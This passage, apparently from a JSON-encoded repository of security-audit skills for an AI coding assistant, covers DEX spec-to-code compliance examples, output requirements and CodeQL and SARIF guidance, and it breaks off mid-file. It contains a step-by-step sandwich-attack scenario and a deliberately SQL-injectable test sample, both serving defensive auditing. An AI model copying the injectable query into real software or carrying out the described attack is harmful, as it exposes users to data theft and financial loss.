] Full Alignment Matrix included (table showing all speccode mappings with status)\n- [ ] All IR artifacts embedded or linked (Spec-IR, Code-IR, Alignment-IR, Divergence Findings)\n- [ ] Divergence Findings prioritized by severity (CRITICAL  HIGH  MEDIUM  LOW)\n- [ ] Recommended remediations prioritized by risk reduction\n- [ ] Documentation update suggestions provided (if spec needs clarification)\n",
        "plugins/spec-to-code-compliance/skills/spec-to-code-compliance/resources/IR_EXAMPLES.md": "# Intermediate Representation Examples\n\nThe following examples demonstrate the complete IR workflow using realistic DEX swap patterns.\n\n---\n\n## Example 1: Spec-IR Record\n\n**Scenario:** Extracting a security requirement from a DEX protocol whitepaper.\n\n```yaml\nid: SPEC-001\nspec_excerpt: \"All swaps MUST enforce maximum slippage of 1% to protect users from sandwich attacks\"\nsource_section: \"Whitepaper 4.1 - Trading Mechanism & User Protection\"\nsource_document: \"dex-protocol-whitepaper-v3.pdf\"\nsemantic_type: invariant\nnormalized_form:\n  type: constraint\n  entity: swap_transaction\n  operation: token_exchange\n  condition: \"abs((actual_output - expected_output) / expected_output) <= 0.01\"\n  enforcement: MUST (mandatory)\n  rationale: \"sandwich_attack_prevention\"\nconfidence: 1.0\nnotes: \"Slippage measured as percentage deviation from expected output at transaction submission time\"\n```\n\n**What this shows:**\n- Extraction of trading protection requirement with full traceability\n- Normalized form makes slippage calculation explicit and machine-verifiable\n- High confidence (1.0) because requirement is stated explicitly with specific percentage\n- Notes clarify measurement methodology\n\n---\n\n## Example 2: Code-IR Record\n\n**Scenario:** Analyzing the `swap()` function in a DEX router contract.\n\n```yaml\nid: CODE-001\nfile: \"contracts/Router.sol\"\nfunction: \"swap(address tokenIn, address tokenOut, uint256 amountIn, uint256 minAmountOut, uint256 deadline)\"\nlines: 89-135\nvisibility: external\nmodifiers: [nonReentrant, ensure(deadline)]\n\nbehavior:\n  preconditions:\n    - condition: \"block.timestamp <= deadline\"\n      line: 90\n      enforcement: modifier (ensure)\n      purpose: \"prevent stale transactions\"\n    - condition: \"amountIn > 0\"\n      line: 92\n      enforcement: require\n    - condition: \"minAmountOut > 0\"\n      line: 93\n      enforcement: require\n    - condition: \"tokenIn != tokenOut\"\n      line: 94\n      enforcement: require\n\n  state_reads:\n    - variable: \"pairs[tokenIn][tokenOut]\"\n      line: 98\n      purpose: \"get liquidity pool address\"\n    - variable: \"reserves[pair]\"\n      line: 102\n      purpose: \"get current pool reserves\"\n    - variable: \"feeRate\"\n      line: 108\n      purpose: \"calculate trading fee\"\n\n  state_writes:\n    - variable: \"reserves[pair].reserve0\"\n      line: 125\n      operation: \"update after swap\"\n    - variable: \"reserves[pair].reserve1\"\n      line: 126\n      operation: \"update after swap\"\n\n  computations:\n    - operation: \"amountInWithFee = amountIn * 997\"\n      line: 108\n      purpose: \"apply 0.3% fee (997/1000)\"\n    - operation: \"amountOut = (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee)\"\n      line: 110-111\n      purpose: \"constant product formula (x * y = k)\"\n    - operation: \"slippageCheck = amountOut >= minAmountOut\"\n      line: 115\n      purpose: \"enforce user-specified minimum output\"\n\n  external_calls:\n    - target: \"IERC20(tokenIn).transferFrom(msg.sender, pair, amountIn)\"\n      line: 118\n      type: \"ERC20 transfer\"\n      return_handling: \"require success\"\n    - target: \"IERC20(tokenOut).transfer(msg.sender, amountOut)\"\n      line: 122\n      type: \"ERC20 transfer\"\n      return_handling: \"require success\"\n\n  events:\n    - name: \"Swap\"\n      line: 130\n      parameters: \"msg.sender, tokenIn, tokenOut, amountIn, amountOut\"\n\n  postconditions:\n    - \"amountOut >= minAmountOut (slippage protection enforced)\"\n    - \"reserves updated to maintain K=xy invariant\"\n    - \"tokenIn transferred from user to pool\"\n    - \"tokenOut transferred from pool to user\"\n\ninvariants_enforced:\n  - \"slippage_protection: amountOut >= minAmountOut (line 115)\"\n  - \"constant_product: reserveIn * reserveOut >= k_before (line 125-126)\"\n  - \"fee_application: effective_rate = 0.3% (line 108)\"\n```\n\n**What this shows:**\n- Complete DEX swap function analysis with line-level precision\n- Captures AMM constant product formula and fee mechanics\n- Documents slippage protection enforcement at line 115\n- Shows state transitions (reserve updates) and external interactions\n- All claims reference specific line numbers for traceability\n\n---\n\n## Example 3: Alignment Record (Positive Case)\n\n**Scenario:** Verifying that the swap function correctly implements the 0.3% fee requirement.\n\n```yaml\nid: ALIGN-001\nspec_ref: SPEC-002\ncode_ref: CODE-001\n\nspec_claim: \"Protocol MUST charge exactly 0.3% fee on all swaps\"\nspec_source: \"Whitepaper 4.2 - Fee Structure\"\n\ncode_behavior: \"amountInWithFee = amountIn * 997 (line 108), effective fee = (1000-997)/1000 = 0.3%\"\ncode_location: \"Router.sol:L108\"\n\nmatch_type: full_match\nconfidence: 1.0\n\nreasoning: |\n  Spec requires: 0.3% fee on all swaps\n  Code implements: amountIn * 997 / 1000\n\n  Mathematical verification:\n  - Fee deduction: 1000 - 997 = 3\n  - Fee percentage: 3 / 1000 = 0.003 = 0.3% \n\n  The code uses numerator 997 instead of explicit fee subtraction,\n  but this is mathematically equivalent and gas-optimized.\n\n  Enforcement: Fee is applied before price calculation (line 108-111),\n  ensuring it affects the swap output. Cannot be bypassed.\n\nevidence:\n  spec_quote: \"The protocol charges a fixed 0.3% fee on the input amount for every swap transaction\"\n  spec_location: \"Whitepaper 4.2, page 8, paragraph 1\"\n  code_quote: \"uint256 amountInWithFee = amountIn * 997; // 0.3% fee: (1000-997)/1000\"\n  code_location: \"Router.sol:L108\"\n\n  verification_steps:\n    - \"Checked numerator 997 is used consistently\"\n    - \"Verified denominator 1000 matches in formula at L110-111\"\n    - \"Confirmed fee applies to all swap paths (no conditional logic)\"\n    - \"Validated fee is not configurable (hardcoded = guaranteed)\"\n\nambiguity_notes: null\n```\n\n**What this shows:**\n- Successful alignment between spec requirement and code implementation\n- Mathematical proof that 997/1000 = 0.3% fee\n- Reasoning explains WHY implementation is correct (gas optimization via numerator)\n- Evidence provides exact quotes and line numbers\n- High confidence (1.0) due to clear mathematical equivalence\n\n---\n\n## Example 4: Divergence Finding (Critical Issue)\n\n**Scenario:** Identifying that the critical slippage protection requirement is completely missing.\n\n```yaml\nid: DIV-001\nseverity: CRITICAL\ntitle: \"Missing slippage protection enables unlimited sandwich attacks\"\n\nspec_claim:\n  excerpt: \"All swaps MUST enforce maximum slippage of 1% to protect users from sandwich attacks\"\n  source: \"Whitepaper 4.1 - Trading Mechanism & User Protection\"\n  source_location: \"Page 7, paragraph 3\"\n  semantic_type: security_constraint\n  enforcement_level: MUST (mandatory)\n\ncode_finding:\n  file: \"contracts/RouterV1.sol\"\n  function: \"swap(address tokenIn, address tokenOut, uint256 amountIn)\"\n  lines: 45-78\n  observation: \"Function signature lacks minAmountOut parameter; no slippage validation exists\"\n\nmatch_type: missing_in_code\nconfidence: 1.0\n\nreasoning: |\n  Specification Analysis:\n  - Spec explicitly requires: \"MUST enforce maximum slippage of 1%\"\n  - Requirement scope: \"All swaps\" (no exceptions)\n  - Purpose stated: \"protect users from sandwich attacks\"\n\n  Code Analysis:\n  - Function signature: swap(tokenIn, tokenOut, amountIn)\n  - Missing parameter: minAmountOut (required for slippage check)\n  - Line-by-line review of function body (L45-L78):\n    * L50-55: Price calculation from reserves\n    * L58-60: Fee deduction (0.3%)\n    * L62-65: Output amount calculation\n    * L68: Transfer tokenIn from user\n    * L72: Transfer tokenOut to user\n    * L75: Emit Swap event\n  - NO slippage validation found anywhere in function\n\n  Gap: Spec requires slippage protection  Code provides zero protection\n\n  Additional verification:\n  - Searched entire RouterV1.sol for \"slippage\", \"minAmount\", \"minOutput\": 0 results\n  - Checked if validation exists in called functions: None found\n  - Verified no modifiers perform slippage check: Confirmed absent\n\nevidence:\n  spec_evidence:\n    quote: \"To protect users from front-running and sandwich attacks, all swap operations MUST enforce a maximum slippage of 1% between the expected and actual output amounts\"\n    location: \"Whitepaper 4.1, page 7, paragraph 3\"\n    emphasis: \"MUST\" indicates mandatory requirement\n\n  code_evidence:\n    function_signature: \"function swap(address tokenIn, address tokenOut, uint256 amountIn) external\"\n    signature_location: \"RouterV1.sol:L45\"\n    missing_parameter: \"uint256 minAmountOut\"\n\n    function_body_summary: |\n      L50: uint256 amountOut = calculateSwapOutput(tokenIn, tokenOut, amountIn);\n      L68: IERC20(tokenIn).transferFrom(msg.sender, pair, amountIn);\n      L72: IERC20(tokenOut).transfer(msg.sender, amountOut);\n\n      CRITICAL ISSUE: No validation that amountOut meets user expectations\n\n    search_results:\n      - pattern: \"minAmountOut\"  0 occurrences in RouterV1.sol\n      - pattern: \"slippage\"  0 occurrences in RouterV1.sol\n      - pattern: \"require.*amountOut\"  0 occurrences in RouterV1.sol\n      - pattern: \"amountOut >=\"  0 occurrences in RouterV1.sol\n\nexploitability: |\n  Attack Vector: Classic Sandwich Attack\n\n  Prerequisites:\n  - Attacker monitors public mempool for pending swap transactions\n  - Attacker has capital to move market price (typically 10-50x target trade size)\n  - Target trade is on-chain (not private mempool)\n\n  Attack Sequence:\n\n  1. Detection Phase\n     - Victim submits swap: 100 ETH  USDC\n     - Expected output at current price: 200,000 USDC (price = $2,000/ETH)\n     - Transaction appears in mempool with no slippage protection\n\n  2. Front-Run Transaction\n     - Attacker submits swap: 500 ETH  USDC (higher gas to execute first)\n     - Large buy moves price: $2,000  $2,100 (+5%)\n     - Pool reserves now imbalanced\n\n  3. Victim Transaction Executes\n     - Victim's 100 ETH swap executes at manipulated price\n     - Actual output: 195,122 USDC (effective price $1,951/ETH)\n     - Victim loses: 4,878 USDC vs expected 200,000\n     - Loss percentage: 2.4% of trade value\n     - NO PROTECTION: Transaction succeeds despite 2.4% slippage (exceeds 1% spec limit)\n\n  4. Back-Run Transaction\n     - Attacker sells USDC  ETH at inflated price\n     - Profits from price impact: ~$4,500\n     - Price returns toward equilibrium\n\n  Economic Analysis:\n  - Victim trade size: $200,000\n  - Attacker cost: Gas fees (~$50-100)\n  - Attacker profit: ~$4,500 (net ~$4,400)\n  - Victim loss: $4,878 (2.4% slippage)\n  - Attack ROI: 4400% in single block\n\n  Impact Scale:\n  - Per transaction: $500 - $10,000 extractable (depending on trade size)\n  - Daily volume: $10M  potential $100K-500K daily extraction\n  - Unlimited because: No slippage check = no upper bound on extraction\n\n  Real-World Precedent:\n  - SushiSwap (2020): Suffered sandwich attacks before slippage protection\n  - Average loss per victim: 1-5% of trade value\n  - Specification exists specifically to prevent this attack class\n\nremediation:\n  immediate_fix: |\n    Add minAmountOut parameter and enforce slippage protection:\n\n    ```solidity\n    function swap(\n        address tokenIn,\n        address tokenOut,\n        uint256 amountIn,\n        uint256 minAmountOut,  // NEW: User-specified minimum output\n        uint256 deadline        // NEW: Prevent stale transactions\n    ) external ensure(deadline) nonReentrant {\n        require(amountIn > 0, \"Invalid input amount\");\n        require(minAmountOut > 0, \"Invalid minimum output\");  // NEW\n\n        // Existing price calculation\n        uint256 amountOut = calculateSwapOutput(tokenIn, tokenOut, amountIn);\n\n        // NEW: Enforce slippage protection\n        require(amountOut >= minAmountOut, \"Slippage exceeded\");\n\n        // Rest of swap logic...\n    }\n    ```\n\n    This allows users to specify maximum acceptable slippage:\n    - User calculates expected output: 200,000 USDC\n    - User sets minAmountOut: 198,000 USDC (1% slippage tolerance)\n    - Sandwich attack moves price 2.4%  transaction reverts\n    - User protected from excessive value extraction\n\n  long_term_improvements: |\n    1. Add helper function for slippage calculation:\n       ```solidity\n       function calculateMinOutput(\n           uint256 expectedOutput,\n           uint256 slippageBps  // basis points, e.g., 100 = 1%\n       ) public pure returns (uint256) {\n           return expectedOutput * (10000 - slippageBps) / 10000;\n       }\n       ```\n\n    2. Implement deadline parameter (as shown in immediate fix)\n       - Prevents stale transactions from executing at unexpected prices\n       - Standard in Uniswap V2/V3\n\n    3. Add price impact warnings in UI:\n       - Show estimated price impact before transaction\n       - Warn if impact exceeds 1% (spec threshold)\n       - Suggest splitting large trades\n\n    4. Consider TWAP (Time-Weighted Average Price) validation:\n       - Compare spot price vs 30-min TWAP\n       - Reject if deviation exceeds threshold\n       - Prevents oracle manipulation attacks\n\n    5. Add events for slippage monitoring:\n       ```solidity\n       event SlippageApplied(\n           address indexed user,\n           uint256 expectedOutput,\n           uint256 actualOutput,\n           uint256 slippageBps\n       );\n       ```\n\n  testing_requirements: |\n    1. Unit test: Swap with 0.5% slippage succeeds\n    2. Unit test: Swap with 1.5% slippage reverts\n    3. Integration test: Simulate sandwich attack, verify protection\n    4. Fuzz test: Random minAmountOut values, verify correct revert behavior\n    5. Mainnet fork test: Replay historical sandwich attacks, verify prevention\n\n  breaking_changes: |\n    YES - This is a breaking change to the swap() function signature.\n\n    Migration path:\n    1. Deploy RouterV2 with new signature\n    2. Update frontend to calculate and pass minAmountOut\n    3. Deprecate RouterV1 after 30-day migration period\n    4. Add wrapper function in RouterV1 for backward compatibility:\n       ```solidity\n       function swapLegacy(address tokenIn, address tokenOut, uint256 amountIn) external {\n           uint256 expectedOutput = getExpectedOutput(tokenIn, tokenOut, amountIn);\n           uint256 minOutput = expectedOutput * 99 / 100;  // 1% default slippage\n           swap(tokenIn, tokenOut, amountIn, minOutput, block.timestamp + 300);\n       }\n       ```\n\n  specification_update: |\n    If slippage protection is intentionally omitted (NOT recommended):\n\n    Update whitepaper 4.1 to:\n    \"Swaps execute at current market price without slippage protection.\n    Users are responsible for sandwich attack mitigation via:\n    - Private transaction channels (Flashbots, MEV-Blocker)\n    - Off-chain price monitoring and transaction cancellation\n    - External slippage calculation and manual validation\n\n    WARNING: On-chain swaps are vulnerable to MEV extraction.\"\n```\n\n**What this shows:**\n- Complete divergence finding with CRITICAL severity\n- Evidence-based: Shows exhaustive search for slippage protection (0 results)\n- Detailed exploit scenario with concrete numbers ($200k trade  $4,878 loss)\n- Economic impact quantification (ROI, daily volume, extraction potential)\n- Comprehensive remediation with code examples, testing requirements, migration path\n- Distinguishes between fixing code vs updating spec (if intentional)\n",
        "plugins/spec-to-code-compliance/skills/spec-to-code-compliance/resources/OUTPUT_REQUIREMENTS.md": "# Output Requirements & Quality Thresholds\n\nWhen performing spec-to-code compliance analysis, Claude MUST produce structured IR following the formats demonstrated in [IR_EXAMPLES.md](IR_EXAMPLES.md).\n\n---\n\n## Required IR Production\n\nFor EACH phase, output MUST include:\n\n### Phase 2 - Spec-IR (mandatory)\n- MUST extract ALL intended behavior into Spec-IR records\n- Each record MUST include: `id`, `spec_excerpt`, `source_section`, `source_document`, `semantic_type`, `normalized_form`, `confidence`\n- MUST use YAML format matching Example 1\n- MUST extract minimum 10 Spec-IR items for any non-trivial specification (5+ pages of documentation)\n- MUST include confidence scores (0-1) for all extractions\n- MUST document both explicit and implicit invariants\n\n### Phase 3 - Code-IR (mandatory)\n- MUST analyze EVERY function with structured extraction\n- Each record MUST include: `id`, `file`, `function`, `lines`, `visibility`, `modifiers`, `behavior` (preconditions, state_reads, state_writes, computations, external_calls, events, postconditions), `invariants_enforced`\n- MUST use YAML format matching Example 2\n- MUST document line numbers for ALL claims (every precondition, state read/write, computation, external call)\n- MUST capture full control flow (all conditional branches, revert paths)\n- MUST identify all external interactions with risk analysis\n\n### Phase 4 - Alignment-IR (mandatory)\n- MUST compare EVERY Spec-IR item against Code-IR\n- Each record MUST include: `id`, `spec_ref`, `code_ref`, `spec_claim`, `code_behavior`, `match_type`, `confidence`, `reasoning`, `evidence`\n- MUST classify using exactly one of: `full_match`, `partial_match`, `mismatch`, `missing_in_code`, `code_stronger_than_spec`, `code_weaker_than_spec`\n- MUST use YAML format matching Example 3\n- MUST provide reasoning trace explaining WHY classification was chosen\n- MUST include evidence with exact quotes and locations from both spec and code\n- Every Spec-IR item MUST have corresponding Alignment record (no gaps)\n\n### Phase 5 - Divergence Findings (when applicable)\n- MUST create detailed finding for EVERY `mismatch`, `missing_in_code`, or `code_weaker_than_spec`\n- Each finding MUST include: `id`, `severity`, `title`, `spec_claim`, `code_finding`, `match_type`, `confidence`, `reasoning`, `evidence`, `exploitability`, `remediation`\n- MUST use YAML format matching Example 4\n- MUST quantify impact with concrete numbers (not \"could be exploited\" but \"attacker gains $X, victim loses $Y\")\n- MUST provide exploitability analysis with attack scenarios (prerequisites, sequence, impact)\n- MUST include remediation with code examples and testing requirements\n\n### Phase 6 - Final Report (mandatory)\n- MUST produce structured report following 16-section format defined in Phase 6\n- MUST include all IR artifacts (Spec-IR, Code-IR, Alignment-IR, Divergence Findings)\n- MUST provide Full Alignment Matrix showing all speccode mappings\n- MUST quantify risk and prioritize remediations\n\n---\n\n## Quality Thresholds\n\nA complete spec-to-code compliance analysis MUST achieve:\n\n### Spec-IR minimum standards:\n- Minimum 10 Spec-IR items for non-trivial specifications\n- At least 3 invariants extracted (explicit or implicit)\n- At least 2 security requirements identified (MUST/NEVER/ALWAYS keywords)\n- At least 1 math formula or economic assumption documented\n- Confidence scores for all extractions (no missing scores)\n\n### Code-IR minimum standards:\n- EVERY public/external function analyzed (no gaps in coverage)\n- Minimum 3 invariants documented per analyzed function\n- ALL external calls identified with return handling documented\n- ALL state modifications tracked (reads and writes)\n- Line number citations for ALL claims (100% traceability)\n\n### Alignment-IR minimum standards:\n- EVERY Spec-IR item has corresponding Alignment record (complete matrix)\n- Reasoning provided for all match_type classifications\n- Evidence includes exact quotes from both spec and code\n- Ambiguities explicitly flagged (never guessed or inferred)\n- Confidence scores reflect actual certainty (not placeholder 1.0 for everything)\n\n### Divergence Finding minimum standards:\n- EVERY CRITICAL/HIGH finding has exploit scenario with concrete attack sequence\n- Economic impact quantified with dollar amounts or percentages\n- Remediation includes code examples (not just \"add validation\")\n- Testing requirements specified (unit tests, integration tests, fuzz tests)\n- Breaking changes documented with migration path\n\n---\n\n## Format Consistency\n\n- MUST use YAML for all IR records (Spec-IR, Code-IR, Alignment-IR, Divergence)\n- MUST use consistent field names across all records (e.g., `spec_excerpt` not `specification_text`)\n- MUST reference line numbers in format: `L45`, `lines: 89-135`, `line 108`\n- MUST cite spec locations: `\"Section 4.1\"`, `\"Page 7, paragraph 3\"`, `\"Whitepaper section 2.3\"`\n- MUST use markdown code blocks with language tags: ` ```yaml `, ` ```solidity `\n- MUST separate major sections with `---` horizontal rules\n\n---\n\n## Anti-Hallucination Requirements\n\n- NEVER infer behavior not present in spec or code\n- ALWAYS quote exact text (spec_quote, code_quote in evidence)\n- ALWAYS provide line numbers for code claims\n- ALWAYS provide section/page for spec claims\n- If uncertain: Set confidence < 0.8 and document ambiguity\n- If spec is silent: Classify as `UNDOCUMENTED`, never guess\n- If code adds behavior: Classify as `code_stronger_than_spec`, document in Alignment-IR\n",
        "plugins/static-analysis/.claude-plugin/plugin.json": "{\n  \"name\": \"static-analysis\",\n  \"version\": \"1.0.1\",\n  \"description\": \"Static analysis toolkit with CodeQL, Semgrep, and SARIF parsing for security vulnerability detection\",\n  \"author\": {\n    \"name\": \"Axel Mierczuk\"\n  }\n}\n",
        "plugins/static-analysis/README.md": "# Static Analysis\n\nA comprehensive static analysis toolkit with CodeQL, Semgrep, and SARIF parsing for security vulnerability detection.\n\nCodeQL and Semgrep skills are based on the Trail of Bits Testing Handbook:\n\n- [CodeQL Testing Handbook](https://appsec.guide/docs/static-analysis/codeql/)\n- [Semgrep Testing Handbook](https://appsec.guide/docs/static-analysis/semgrep/)\n\n**Author:** Axel Mierczuk\n\n## Skills Included\n\n| Skill           | Purpose                                                  |\n|-----------------|----------------------------------------------------------|\n| `codeql`        | Deep security analysis with taint tracking and data flow |\n| `semgrep`       | Fast pattern-based security scanning                     |\n| `sarif-parsing` | Parse and process results from static analysis tools     |\n\n## When to Use\n\nUse this plugin when you need to:\n- Perform security vulnerability detection on codebases\n- Run CodeQL for interprocedural taint tracking and data flow analysis\n- Use Semgrep for fast pattern-based bug detection\n- Parse SARIF output from security scanners\n- Set up static analysis in CI/CD pipelines\n- Aggregate and deduplicate findings from multiple tools\n\n## What It Does\n\n### CodeQL\n- Create databases for Python, JavaScript, Go, Java, C/C++, and more\n- Run security queries with SARIF/CSV output\n- Write custom QL queries with taint tracking\n- Integrate with GitHub Actions\n\n### Semgrep\n- Quick security scans using built-in rulesets (OWASP, CWE, Trail of Bits)\n- Write custom YAML rules with pattern matching\n- Taint mode for tracking data flow from sources to sinks\n- CI/CD integration with baseline scanning\n\n### SARIF Parsing\n- Understand SARIF 2.1.0 structure\n- Quick analysis using jq for CLI queries\n- Python scripting with pysarif and sarif-tools\n- Aggregate and deduplicate results from multiple files\n- CI/CD integration patterns\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/static-analysis\n```\n\n## Related Skills\n\n- `variant-analysis` - Use CodeQL/Semgrep patterns to find bug variants\n",
        "plugins/static-analysis/skills/codeql/SKILL.md": "---\nname: codeql\ndescription: Run CodeQL static analysis for security vulnerability detection, taint tracking, and data flow analysis. Use when asked to analyze code with CodeQL, create CodeQL databases, write custom QL queries, perform security audits, or set up CodeQL in CI/CD pipelines.\nallowed-tools:\n  - Bash\n  - Read\n  - Glob\n  - Grep\n---\n\n# CodeQL Static Analysis\n\n## When to Use CodeQL\n\n**Ideal scenarios:**\n- Source code access with ability to build (for compiled languages)\n- Open-source projects or GitHub Advanced Security license\n- Need for interprocedural data flow and taint tracking\n- Finding complex vulnerabilities requiring AST/CFG analysis\n- Comprehensive security audits where analysis time is not critical\n\n**Consider Semgrep instead when:**\n- No build capability for compiled languages\n- Licensing constraints\n- Need fast, lightweight pattern matching\n- Simple, single-file analysis is sufficient\n\n### Why Interprocedural Analysis Matters\n\nSimple grep/pattern tools only see one function at a time. Real vulnerabilities often span multiple functions:\n\n```\nHTTP Handler  Input Parser  Business Logic  Database Query\n                                               \n   source      transforms       passes       sink (SQL)\n```\n\nCodeQL tracks data flow across all these steps. A tainted input in the handler can be traced through 5+ function calls to find where it reaches a dangerous sink.\n\nPattern-based tools miss this because they can't connect `request.param` in file A to `db.execute(query)` in file B.\n\n## When NOT to Use\n\nDo NOT use this skill for:\n- Projects that cannot be built (CodeQL requires successful compilation for compiled languages)\n- Quick pattern searches (use Semgrep or grep for speed)\n- Non-security code quality checks (use linters instead)\n- Projects without source code access\n\n## Environment Check\n\n```bash\n# Check if CodeQL is installed\ncommand -v codeql >/dev/null 2>&1 && echo \"CodeQL: installed\" || echo \"CodeQL: NOT installed (run install steps below)\"\n```\n\n## Installation\n\n### CodeQL CLI\n\n```bash\n# macOS/Linux (Homebrew)\nbrew install --cask codeql\n\n# Update\nbrew upgrade codeql\n```\n\nManual: Download bundle from https://github.com/github/codeql-action/releases\n\n### Trail of Bits Queries (Optional)\n\nInstall public ToB security queries for additional coverage:\n\n```bash\n# Download ToB query packs\ncodeql pack download trailofbits/cpp-queries trailofbits/go-queries\n\n# Verify installation\ncodeql resolve qlpacks | grep trailofbits\n```\n\n## Core Workflow\n\n### 1. Create Database\n\n```bash\ncodeql database create codeql.db --language=<LANG> [--command='<BUILD>'] --source-root=.\n```\n\n| Language | `--language=` | Build Required |\n|----------|---------------|----------------|\n| Python | `python` | No |\n| JavaScript/TypeScript | `javascript` | No |\n| Go | `go` | No |\n| Ruby | `ruby` | No |\n| Rust | `rust` | Yes (`--command='cargo build'`) |\n| Java/Kotlin | `java` | Yes (`--command='./gradlew build'`) |\n| C/C++ | `cpp` | Yes (`--command='make -j8'`) |\n| C# | `csharp` | Yes (`--command='dotnet build'`) |\n| Swift | `swift` | Yes (macOS only) |\n\n### 2. Run Analysis\n\n```bash\n# List available query packs\ncodeql resolve qlpacks\n```\n\n**Run security queries:**\n\n```bash\n# SARIF output (recommended)\ncodeql database analyze codeql.db \\\n  --format=sarif-latest \\\n  --output=results.sarif \\\n  -- codeql/python-queries:codeql-suites/python-security-extended.qls\n\n# CSV output\ncodeql database analyze codeql.db \\\n  --format=csv \\\n  --output=results.csv \\\n  -- codeql/javascript-queries\n```\n\n**With Trail of Bits queries (if installed):**\n\n```bash\ncodeql database analyze codeql.db \\\n  --format=sarif-latest \\\n  --output=results.sarif \\\n  -- trailofbits/go-queries\n```\n\n## Writing Custom Queries\n\n### Query Structure\n\nCodeQL uses SQL-like syntax: `from Type x where P(x) select f(x)`\n\n### Basic Template\n\n```ql\n/**\n * @name Find SQL injection vulnerabilities\n * @description Identifies potential SQL injection from user input\n * @kind path-problem\n * @problem.severity error\n * @security-severity 9.0\n * @precision high\n * @id py/sql-injection\n * @tags security\n *       external/cwe/cwe-089\n */\n\nimport python\nimport semmle.python.dataflow.new.DataFlow\nimport semmle.python.dataflow.new.TaintTracking\n\nmodule SqlInjectionConfig implements DataFlow::ConfigSig {\n  predicate isSource(DataFlow::Node source) {\n    // Define taint sources (user input)\n    exists(source)\n  }\n\n  predicate isSink(DataFlow::Node sink) {\n    // Define dangerous sinks (SQL execution)\n    exists(sink)\n  }\n}\n\nmodule SqlInjectionFlow = TaintTracking::Global<SqlInjectionConfig>;\n\nfrom SqlInjectionFlow::PathNode source, SqlInjectionFlow::PathNode sink\nwhere SqlInjectionFlow::flowPath(source, sink)\nselect sink.getNode(), source, sink, \"SQL injection from $@.\", source.getNode(), \"user input\"\n```\n\n### Query Metadata\n\n| Field | Description | Values |\n|-------|-------------|--------|\n| `@kind` | Query type | `problem`, `path-problem` |\n| `@problem.severity` | Issue severity | `error`, `warning`, `recommendation` |\n| `@security-severity` | CVSS score | `0.0` - `10.0` |\n| `@precision` | Confidence | `very-high`, `high`, `medium`, `low` |\n\n### Key Language Features\n\n```ql\n// Predicates\npredicate isUserInput(DataFlow::Node node) {\n  exists(Call c | c.getFunc().(Attribute).getName() = \"get\" and node.asExpr() = c)\n}\n\n// Transitive closure: + (one or more), * (zero or more)\nnode.getASuccessor+()\n\n// Quantification\nexists(Variable v | v.getName() = \"password\")\nforall(Call c | c.getTarget().hasName(\"dangerous\") | hasCheck(c))\n```\n\n## Creating Query Packs\n\n```bash\ncodeql pack init myorg/security-queries\n```\n\nStructure:\n```\nmyorg-security-queries/\n qlpack.yml\n src/\n    SqlInjection.ql\n test/\n     SqlInjectionTest.expected\n```\n\n**qlpack.yml:**\n```yaml\nname: myorg/security-queries\nversion: 1.0.0\ndependencies:\n  codeql/python-all: \"*\"\n```\n\n## CI/CD Integration (GitHub Actions)\n\n```yaml\nname: CodeQL Analysis\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n  schedule:\n    - cron: '0 0 * * 1'  # Weekly\n\njobs:\n  analyze:\n    runs-on: ubuntu-latest\n    permissions:\n      actions: read\n      contents: read\n      security-events: write\n\n    strategy:\n      matrix:\n        language: ['python', 'javascript']\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Initialize CodeQL\n        uses: github/codeql-action/init@v3\n        with:\n          languages: ${{ matrix.language }}\n          queries: security-extended,security-and-quality\n          # Add custom queries/packs:\n          # queries: security-extended,./codeql/custom-queries\n          # packs: trailofbits/python-queries\n\n      - uses: github/codeql-action/autobuild@v3\n\n      - uses: github/codeql-action/analyze@v3\n        with:\n          category: \"/language:${{ matrix.language }}\"\n```\n\n## Testing Queries\n\n```bash\ncodeql test run test/\n```\n\nTest file format:\n```python\ndef vulnerable():\n    user_input = request.args.get(\"q\")  # Source\n    cursor.execute(\"SELECT * FROM users WHERE id = \" + user_input)  # Alert: sql-injection\n\ndef safe():\n    user_input = request.args.get(\"q\")\n    cursor.execute(\"SELECT * FROM users WHERE id = ?\", (user_input,))  # OK\n```\n\n## Troubleshooting\n\n| Issue | Solution |\n|-------|----------|\n| Database creation fails | Clean build environment, verify build command works independently |\n| Slow analysis | Use `--threads`, narrow query scope, check query complexity |\n| Missing results | Check file exclusions, verify source files were parsed |\n| Out of memory | Set `CODEQL_RAM=48000` environment variable (48GB) |\n| CMake source path issues | Adjust `--source-root` to point to actual source location |\n\n## Rationalizations to Reject\n\n| Shortcut | Why It's Wrong |\n|----------|----------------|\n| \"No findings means the code is secure\" | CodeQL only finds patterns it has queries for; novel vulnerabilities won't be detected |\n| \"This code path looks safe\" | Complex data flow can hide vulnerabilities across 5+ function calls; trace the full path |\n| \"Small change, low risk\" | Small changes can introduce critical bugs; run full analysis on every change |\n| \"Tests pass so it's safe\" | Tests prove behavior, not absence of vulnerabilities; they test expected paths, not attacker paths |\n| \"The query didn't flag it\" | Default query suites don't cover everything; check if custom queries are needed for your domain |\n\n## Resources\n\n- Docs: https://codeql.github.com/docs/\n- Query Help: https://codeql.github.com/codeql-query-help/\n- Security Lab: https://securitylab.github.com/\n- Trail of Bits Queries: https://github.com/trailofbits/codeql-queries\n- VSCode Extension: \"CodeQL\" for query development\n",
        "plugins/static-analysis/skills/sarif-parsing/SKILL.md": "---\nname: sarif-parsing\ndescription: Parse, analyze, and process SARIF (Static Analysis Results Interchange Format) files. Use when reading security scan results, aggregating findings from multiple tools, deduplicating alerts, extracting specific vulnerabilities, or integrating SARIF data into CI/CD pipelines.\nallowed-tools:\n  - Bash\n  - Read\n  - Glob\n  - Grep\n---\n\n# SARIF Parsing Best Practices\n\nYou are a SARIF parsing expert. Your role is to help users effectively read, analyze, and process SARIF files from static analysis tools.\n\n## When to Use\n\nUse this skill when:\n- Reading or interpreting static analysis scan results in SARIF format\n- Aggregating findings from multiple security tools\n- Deduplicating or filtering security alerts\n- Extracting specific vulnerabilities from SARIF files\n- Integrating SARIF data into CI/CD pipelines\n- Converting SARIF output to other formats\n\n## When NOT to Use\n\nDo NOT use this skill for:\n- Running static analysis scans (use CodeQL or Semgrep skills instead)\n- Writing CodeQL or Semgrep rules (use their respective skills)\n- Analyzing source code directly (SARIF is for processing existing scan results)\n- Triaging findings without SARIF input (use variant-analysis or audit skills)\n\n## SARIF Structure Overview\n\nSARIF 2.1.0 is the current OASIS standard. Every SARIF file has this hierarchical structure:\n\n```\nsarifLog\n version: \"2.1.0\"\n 